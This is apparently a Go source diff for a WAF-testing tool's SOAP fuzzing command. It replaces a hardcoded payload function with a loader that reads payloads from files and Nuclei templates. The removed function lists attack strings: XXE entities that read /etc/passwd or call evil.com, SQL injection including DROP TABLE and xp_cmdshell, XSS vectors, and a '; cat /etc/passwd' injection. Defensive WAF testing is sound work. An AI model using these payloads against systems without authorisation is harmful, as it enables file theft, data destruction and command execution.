@@ -11,6 +11,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/waftester/waftester/pkg/defaults"
 	"github.com/waftester/waftester/pkg/soap"
 	"github.com/waftester/waftester/pkg/ui"
 )
@@ -44,6 +45,8 @@ func runSOAP() {
 	// Fuzzing options
 	fuzz := soapFlags.Bool("fuzz", false, "Fuzz SOAP operations with attack payloads")
 	payloadCategory := soapFlags.String("category", "xxe", "Payload category for fuzzing: xxe, sqli, xss")
+	payloadDir := soapFlags.String("payloads", defaults.PayloadDir, "Payload directory")
+	templateDir := soapFlags.String("template-dir", defaults.TemplateDir, "Nuclei template directory")
 	concurrency := soapFlags.Int("c", 10, "Concurrency level")
 	rateLimit := soapFlags.Float64("rl", 30, "Requests per second")
 
@@ -123,7 +126,7 @@ func runSOAP() {
 	// Execute requested operation
 	switch {
 	case *fuzz:
-		runSOAPFuzz(ctx, client, endpointURL, *payloadCategory, *concurrency, *rateLimit, *outputFile, *jsonOutput)
+		runSOAPFuzz(ctx, client, endpointURL, *payloadDir, *templateDir, *payloadCategory, *concurrency, *rateLimit, *outputFile, *jsonOutput)
 
 	case *operation != "" || *data != "" || *dataFile != "":
 		runSOAPCall(ctx, client, *operation, *action, *data, *dataFile, *headers, *jsonOutput, *verbose)
@@ -245,7 +248,7 @@ func runSOAPCall(ctx context.Context, client *soap.Client, operation, action, da
 	}
 }
 
-func runSOAPFuzz(ctx context.Context, client *soap.Client, endpoint, category string, concurrency int, rateLimit float64, outputFile string, jsonOutput bool) {
+func runSOAPFuzz(ctx context.Context, client *soap.Client, endpoint, payloadDir, templateDir, category string, concurrency int, rateLimit float64, outputFile string, jsonOutput bool) {
 	type fuzzResult struct {
 		Payload    string `json:"payload"`
 		Category   string `json:"category"`
@@ -260,8 +263,8 @@ func runSOAPFuzz(ctx context.Context, client *soap.Client, endpoint, category st
 	_ = concurrency
 	_ = rateLimit
 
-	// Get attack payloads for the category
-	payloads := getSOAPFuzzPayloads(category)
+	// Get attack payloads from unified engine (JSON + Nuclei templates)
+	payloads := getUnifiedFuzzPayloads(payloadDir, templateDir, category, 50, false)
 
 	if !jsonOutput {
 		ui.PrintConfigLine("Payloads", fmt.Sprintf("%d", len(payloads)))
@@ -338,42 +341,5 @@ func runSOAPFuzz(ctx context.Context, client *soap.Client, endpoint, category st
 		ui.PrintConfigLine("Total Tests", fmt.Sprintf("%d", len(results)))
 		ui.PrintConfigLine("Blocked", fmt.Sprintf("%d", blocked))
 		ui.PrintConfigLine("Passed", fmt.Sprintf("%d", len(results)-blocked))
-	}
-}
-
-func getSOAPFuzzPayloads(category string) []string {
-	switch category {
-	case "xxe":
-		return []string{
-			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
-			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
-			`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
-			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>`,
-			`<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,
-		}
-	case "sqli":
-		return []string{
-			"' OR '1'='1",
-			"1; DROP TABLE users--",
-			"admin'--",
-			"1 UNION SELECT * FROM users",
-			"'; EXEC xp_cmdshell('dir')--",
-		}
-	case "xss":
-		return []string{
-			"<script>alert(1)</script>",
-			"<img src=x onerror=alert(1)>",
-			"javascript:alert(1)",
-			"<svg onload=alert(1)>",
-			"&lt;script&gt;alert(1)&lt;/script&gt;",
-		}
-	default:
-		return []string{
-			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
-			"' OR '1'='1",
-			"<script>alert(1)</script>",
-			"; cat /etc/passwd",
-			"{{7*7}}",
-		}
 	}
 }
